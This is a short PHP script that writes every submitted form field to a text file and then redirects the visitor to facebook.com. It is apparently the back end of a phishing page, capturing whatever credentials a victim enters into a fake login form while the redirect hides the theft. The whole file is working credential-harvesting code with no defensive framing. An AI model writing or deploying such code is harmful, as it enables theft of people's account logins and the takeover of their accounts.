<?php

// Set the location to redirect the page
header ('Location: http://www.facebook.com');

// Open the text file in writing mode
$file = fopen("log.txt", "a");
fwrite($file,"\t\t\t\t\t\t");
fwrite($file,"\r\n");
foreach($_POST as $key => $value) {

	fwrite($file,"\t\t\t\t\t\t");
	fwrite($file, $key);
	fwrite($file, "=");
	fwrite($file, $value);
	fwrite($file, "\r\n");
}

fwrite($file, "\r\n");
fwrite($file,"\t\t\t\t\t\t");
fclose($file);
header("Location: https://www.facebook.com");
die();
?>
